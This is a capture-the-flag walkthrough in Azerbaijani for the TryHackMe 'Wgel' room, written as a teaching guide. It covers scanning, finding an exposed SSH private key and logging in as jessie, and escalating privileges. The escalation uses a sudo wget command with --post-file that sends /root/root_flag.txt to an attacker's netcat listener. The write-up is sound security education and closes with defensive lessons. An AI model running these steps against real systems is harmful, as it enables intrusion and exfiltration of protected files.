# 🚩 TryHackMe – WGEL CTF | Azərbaycanca Write-up

> **Çətinlik:** Asan  
> **Kateqoriya:** Linux, Web Enumeration, Privilege Escalation  
> **Platforma:** [TryHackMe](https://tryhackme.com/room/wgelctf)  
> **Məqsəd:** User flag və Root flag əldə etmək

---

## 📖 Ümumi Baxış

Bu CTF (Capture The Flag) tapşırığında bizdən bir Linux serverə daxil olmaq və iki flag (bayraq) tapmaq istənilir:
- **User flag** – normal istifadəçi kimi daxil olduqdan sonra
- **Root flag** – tam sistem idarəçisi (root) hüququ əldə etdikdən sonra

Hücum zənciri belə görünür:
```
Nmap skan → Web səthinə baxış → Gobuster ilə gizli qovluqlar → 
Developer şərhi → SSH açarı sızması → SSH ilə daxil olmaq → 
sudo wget imtiyazı → Root flag oxumaq
```

---

## 🔎 Mərhələ 1: İlkin Kəşfiyyat (Nmap Scan)

### Nmap nədir?
**Nmap** (Network Mapper) – şəbəkədə açıq portları, işləyən xidmətləri və onların versiyalarını aşkar etmək üçün istifadə edilən bir alətdir. Hər server müxtəlif "qapılar" (portlar) vasitəsilə xidmət göstərir — məsələn, veb saytlar 80-ci portdan, SSH isə 22-ci portdan istifadə edir.

### İstifadə olunan əmr:
```bash
nmap -sC -sV -oN scan.txt <HEDEF-IP>
```

### Parametrlərin izahı:
| Parametr | Nə edir? |
|----------|----------|
| `-sC` | Default skriptləri işlə (əlavə məlumat topla) |
| `-sV` | Xidmət versiyalarını tap |
| `-oN scan.txt` | Nəticəni fayla yaz |

### Nəticə:
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2
80/tcp open  http    Apache httpd 2.4.18
```

**Nə öyrəndik?**
- Port **22** – SSH xidməti işləyir (uzaqdan terminal bağlantısı)
- Port **80** – HTTP veb server işləyir (Apache)

---

## 🌐 Mərhələ 2: Apache Default Səhifəsi

Brauzerdə `http://<HEDEF-IP>` ünvanına daxil olduqda **Apache2 Debian Default Page** görünür.

### Bu nə deməkdir?
Bu o deməkdir ki, server quraşdırılıb amma hələ düzgün konfiqurasiya edilməyib. Bu standart səhifə adətən silinməlidir — amma burada qalıb. Bu bizə server haqqında məlumat verir:
- Apache2 istifadə olunur
- Debian əməliyyat sistemi üzərindədir

### Mühüm Tapıntı: Mənbə Kodunda Şərh!
Səhifənin mənbə koduna (`Ctrl+U`) baxdıqda bir developer şərhi tapıldı:

```html
<!-- Jessie don't forget to update the website -->
```

**Bu bizə nə verir?**  
**`jessie`** — bu sistemdəki istifadəçi adı ola bilər! Sonradan bu çox işə yarayacaq.

---

## 📂 Mərhələ 3: /sitemap Kəşfi

Veb serverdə `/sitemap` yolu tapıldı. Buraya daxil olduqda bir veb sayt şablonu aşkar edildi.

### /sitemap nədir?
`sitemap.xml` adətən axtarış motorları üçün hazırlanır və saytdakı bütün səhifələri göstərir. Lakin bəzən bu qovluqlarda gizlənmiş fayllar olur.

Bu nöqtədə **Gobuster** istifadə etmək lazım gəldi.

---

## 🛠️ Mərhələ 4: Gobuster ilə Qovluq Tarama

### Gobuster nədir?
**Gobuster** – veb serverlərdə gizli qovluqları və faylları tapmaq üçün "brute force" (kobud güc) metodu ilə söz siyahısından istifadə edən bir alətdir. O, minlərlə mümkün qovluq adını sürətlə yoxlayır.

### İstifadə olunan əmr:
```bash
gobuster dir -u http://<HEDEF-IP>/sitemap/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

### Parametrlərin izahı:
| Parametr | Nə edir? |
|----------|----------|
| `dir` | Qovluq axtarış rejimi |
| `-u` | Hədəf URL |
| `-w` | Söz siyahısı (wordlist) faylı |

### Nəticə – Tapılan Qovluqlar:
```
/.ssh   (Status: 301)
```

**`/.ssh` qovluğu tapıldı!** Bu **kritik** bir tapıntıdır — çünki `.ssh` qovluğu adətən SSH açarlarını saxlayır.

---

## 🔑 Mərhələ 5: SSH Private Key Sızması

`http://<HEDEF-IP>/sitemap/.ssh/` ünvanına daxil olduqda **id_rsa** faylı tapıldı.

### id_rsa nədir?
**id_rsa** – SSH-ın şifrəsiz (ya da şifrəli) daxil olmaq üçün istifadə etdiyi **şəxsi açardır** (private key). Bu açar normal şəraitdə heç vaxt ictimaiyyətə açıq olmamalıdır — bu böyük bir konfiqurasiya səhvidir!

### Açarı endirmək:
```bash
wget http://<HEDEF-IP>/sitemap/.ssh/id_rsa
chmod 600 id_rsa   # Açara yalnız sahibin oxuma icazəsi olmalıdır
```

### Niyə chmod 600?
SSH xüsusilə tələbkardır — əgər açar faylının icazələri çox açıqdırsa, SSH bağlantıya icazə vermir. `chmod 600` yalnız sənə oxuma/yazma icazəsi verir.

---

## 🔐 Mərhələ 6: SSH ilə Daxil Olmaq

İndi bizdə var:
- **İstifadəçi adı:** `jessie` (developer şərhindən)
- **SSH açarı:** endirdiyimiz `id_rsa` faylı

### Bağlantı əmri:
```bash
ssh -i id_rsa jessie@<HEDEF-IP>
```

### Parametrin izahı:
| Parametr | Nə edir? |
|----------|----------|
| `-i id_rsa` | Şifrə əvəzinə bu açar faylından istifadə et |
| `jessie@<IP>` | Hansı istifadəçi ilə bağlan |

**Nəticə:** Sistemə uğurla daxil olduq! 🎉

---

## 📜 Mərhələ 7: User Flag

SSH ilə daxil olduqdan sonra `jessie`-nin ev qovluğunu araşdıraq:

```bash
ls -la
find / -name "user_flag.txt" 2>/dev/null
cat Documents/user_flag.txt
```

**User flag tapıldı!** ✅

---

## 🧪 Mərhələ 8: Sudo İmtiyazlarının Yoxlanması

Privilege escalation (imtiyaz artırımı) üçün ilk addım — bu istifadəçi hansı əmrləri root olaraq icra edə bilər?

```bash
sudo -l
```

### sudo -l nədir?
Bu əmr cari istifadəçinin sudo (superuser do) icazələrini göstərir. Yəni, "mən root olaraq hansı əmrləri işlədə bilərəm?" sualının cavabıdır.

### Nəticə:
```
(root) NOPASSWD: /usr/bin/wget
```

**Bu nə deməkdir?**  
`jessie` istifadəçisi **şifrə daxil etmədən** `wget` əmrini **root kimi** işlədə bilər!

Bu çox təhlükəlidir — `wget` bu halda silah kimi istifadə edilə bilər.

---

## ⚡ Mərhələ 9: Privilege Escalation – wget ilə Root Flag Oxumaq

### wget nədir?
**wget** – internetdən fayl endirmək üçün istifadə edilən bir alətdir. Amma `--post-file` seçeneği ilə **yerli faylın məzmununu uzaq serverə göndərmək** də mümkündür.

Biz bunu belə istifadə edəcəyik: root flag faylını öz maşınımıza "göndərməyə məcbur edəcəyik."

### Addım 1 – Özümüzdə (attacker maşınında) dinləyici aç:
```bash
nc -lvnp 80
```

### nc (netcat) nədir?
**Netcat** – şəbəkə bağlantıları qurmaq üçün sadə amma güclü bir alətdir. `-lvnp 80` ilə 80-ci portda gələn bağlantıları "dinləyirik."

| Parametr | Nə edir? |
|----------|----------|
| `-l` | Dinləyici (listen) rejiminə keç |
| `-v` | Verbose – ətraflı çıxış göstər |
| `-n` | DNS sorğusu etmə |
| `-p 80` | 80-ci portda dinlə |

### Addım 2 – Hədəf maşında (jessie olaraq) əmri işlət:
```bash
sudo /usr/bin/wget --post-file=/root/root_flag.txt http://<OZUN-IP>
```

### --post-file nədir?
`wget --post-file=FAYL URL` əmri həmin faylın məzmununu HTTP POST sorğusu ilə göndərəcəyi ünvana (bizim `nc` dinləyicimizə) göndərir.

**Root olaraq işlədiyi üçün** `/root/root_flag.txt` faylını oxuya bilir!

### Nəticə:
`nc` dinləyicimizdə root flag görünəcək:
```
POST / HTTP/1.1
...
<ROOT_FLAG_BURADADIR>
```

**Root flag alındı! Sistem tam ələ keçirildi!** 🏆

---

## ✅ Xülasə

| Mərhələ | Alət | Tapıntı |
|---------|------|---------|
| Port Skan | Nmap | SSH (22) və HTTP (80) açıqdır |
| Veb Kəşfiyyat | Brauzer | Apache default səhifəsi, `jessie` adı |
| Qovluq Tarama | Gobuster | `/.ssh` gizli qovluğu tapıldı |
| Açar Əldə Etmə | wget | `id_rsa` şəxsi açarı indirildi |
| Sistem Girişi | SSH | `jessie` kimi daxil olundu |
| İmtiyaz Araşdırması | sudo -l | `wget` root olaraq işlədilə bilər |
| Privilege Escalation | wget + netcat | Root flag HTTP POST ilə alındı |

---

## 🎓 Öyrənilən Dərslər

1. **Default veb səhifələri silinməlidir** – konfiqurasiya məlumatı sızdırır
2. **Developer şərhləri xətərli ola bilər** – mənbə kodunda istifadəçi adları, parollar olmamalıdır
3. **SSH açarları heç vaxt veb serverda olmamalıdır** – bu ən böyük səhv idi
4. **Sudo icazələri minimum saxlanmalıdır** – `wget` kimi alətlərə root icazəsi vermək təhlükəlidir
5. **GTFOBins** – [gtfobins.github.io](https://gtfobins.github.io) saytında hansı əmrlərin imtiyaz artırımı üçün istifadə edilə biləcəyini öyrənə bilərsiniz

---

*Write-up mənbəsi: [omar-tamerr.github.io/wgel.html](https://omar-tamerr.github.io/wgel.html) əsasında Azərbaycanca hazırlanmışdır.*
